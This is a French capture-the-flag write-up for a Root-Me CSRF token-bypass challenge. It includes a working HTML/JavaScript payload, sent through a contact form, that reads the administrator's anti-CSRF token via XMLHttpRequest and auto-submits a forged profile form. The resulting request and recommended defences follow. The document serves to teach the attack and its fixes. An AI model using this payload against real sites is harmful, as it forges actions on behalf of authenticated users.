# Challenge : CSRF - Contournement de Jeton

## Informations

**Plateforme** : Root-Me
**URL** : http://challenge01.root-me.org/web-client/ch23/
**Categorie** : Web - Client
**Type** : CSRF (Cross-Site Request Forgery)
**Difficulte** : Intermediaire

## Objectif

L'objectif est d'activer un compte utilisateur (passer le statut à "Active" / "On") en forçant l'administrateur à valider le formulaire. Le formulaire est protégé par un jeton (token) anti-CSRF qu'il faut récupérer ou contourner.

## Reconnaissance

En analysant le fonctionnement de la page "Profile" :
1.  Le formulaire de modification de profil envoie une requête `POST` vers `?action=profile`.
2.  Cette requête contient un paramètre `token` caché.
3.  Sans ce token, ou avec un token incorrect, la requête est rejetée par le serveur.
4.  Le token est présent dans le code source HTML de la page "Profile" lorsqu'on la consulte.

## Methode d'exploitation

Au lieu de tenter de deviner le token (bruteforce ou analyse cryptographique), la méthode utilisée ici consiste à l'exfiltrer dynamiquement via JavaScript en utilisant les droits de la victime.

1.  **Injection** : On envoie un payload (code malveillant) à l'administrateur via le formulaire de contact.
2.  **Exécution** : Lorsque l'administrateur ouvre le message, le JavaScript s'exécute dans son navigateur.
3.  **Récupération (XHR)** : Le script effectue une requête HTTP (GET) en arrière-plan vers la page de profil. Comme c'est l'administrateur qui fait la requête, son cookie de session est envoyé automatiquement.
4.  **Parsing** : Le script lit la réponse HTML, cherche la chaîne `token" value="..."` et extrait la valeur du jeton.
5.  **Soumission** : Le script insère ce jeton valide dans un formulaire caché et le soumet automatiquement pour valider l'action.

## Payload/POC utilise

Le code suivant a été encodé en Base64 et envoyé via le formulaire de contact (Data URI scheme) :

```html
<form name="csrf" action="[http://challenge01.root-me.org/web-client/ch23/?action=profile](http://challenge01.root-me.org/web-client/ch23/?action=profile)" method="post" enctype="multipart/form-data">
    <input type="hidden" name="username" value="admin@example.com" />
    <input type="hidden" name="status" value="on" />
    <input id="admin-token" type="hidden" name="token" value="" />
</form>

<script>
    // 1. Requête GET pour récupérer la page contenant le token
    var request = new XMLHttpRequest();
    // false = requête synchrone pour bloquer l'exécution jusqu'à la réponse
    request.open("GET", decodeURIComponent("[http://challenge01.root-me.org/web-client/ch23/?action=profile](http://challenge01.root-me.org/web-client/ch23/?action=profile)"), false);
    request.send(null);

    // 2. Analyse de la réponse (Parsing)
    var response = request.responseText;
    // Regex pour capturer la valeur du token
    var groups = response.match("token\" value=\"(.*?)\"");
    var token = groups[1];

    // 3. Injection du token récupéré et soumission du formulaire
    document.getElementById("admin-token").value = token;
    document.csrf.submit();
</script>
````

## Requete HTTP

Lorsque l'attaque réussit, le navigateur de la victime envoie la requête suivante :

```http
POST /web-client/ch23/?action=profile HTTP/1.1
Host: challenge01.root-me.org
Cookie: PHPSESSID=[SESSION_DE_LA_VICTIME]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

Content-Disposition: form-data; name="username"
admin@example.com

Content-Disposition: form-data; name="status"
on

Content-Disposition: form-data; name="token"
[TOKEN_EXTRAIT_VIA_JS]
```

## Explication

Cette attaque contourne la protection car le script s'exécute dans le contexte de sécurité de la victime (Same-Origin ou contexte autorisé par le Data URI). `XMLHttpRequest` permet de lire le contenu de la page `profile` car la victime est authentifiée. Une fois le contenu lu, le token n'est plus un secret et peut être réutilisé immédiatement pour forger la requête POST légitime.

## Screenshots

  - **initial\_request.png** : Analyse de la requête légitime montrant le champ token obligatoire.
  - **exploit.png** : Le payload injecté dans la zone de contact.
  - **flag.png** : Validation du challenge avec le mot de passe affiché.

## Correction recommandee

Pour se prémunir de cette attaque :

1.  **SameSite Cookies** : Configurer les cookies de session avec l'attribut `SameSite=Strict`. Cela empêche l'envoi du cookie lors de requêtes initiées par des tiers.
2.  **Protection XSS** : Cette attaque repose sur l'exécution de JS (ou l'interprétation HTML). Il faut assainir toutes les entrées utilisateurs pour éviter l'injection de scripts.
3.  **Vérification de l'origine** : Vérifier les en-têtes `Origin` et `Referer` côté serveur.

## References

  - OWASP CSRF: https://owasp.org/www-community/attacks/csrf
  - MDN XMLHttpRequest: https://developer.mozilla.org/fr/docs/Web/API/XMLHttpRequest

-----

**Statut** : Resolu

```
```